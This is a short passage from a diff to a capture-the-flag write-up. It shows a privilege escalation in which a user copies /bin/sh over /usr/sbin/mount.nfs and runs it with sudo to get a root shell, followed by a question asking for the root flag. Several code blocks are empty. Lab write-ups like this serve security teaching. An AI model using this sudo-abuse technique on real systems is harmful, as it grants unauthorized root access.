+jojo@tonhotel:~$ cp /bin/sh /usr/sbin/mount.nfs
+```
 
+```bash
+jojo@tonhotel:~$ ls -la /usr/sbin
+```
+
+<h1 align="center">Shell as root</h1
+
+```bash
+jojo@tonhotel:~$ sudo /usr/sbin/mount.nfs
+# 
+```
+
+```bash
+
+```
+
+```
+
+```
 <br>
 <p>1.3. <em>What is the Root flag?</em> Hint: ...if you can get out, what can you use?<br>
 <code>_________________________________________</code></p>
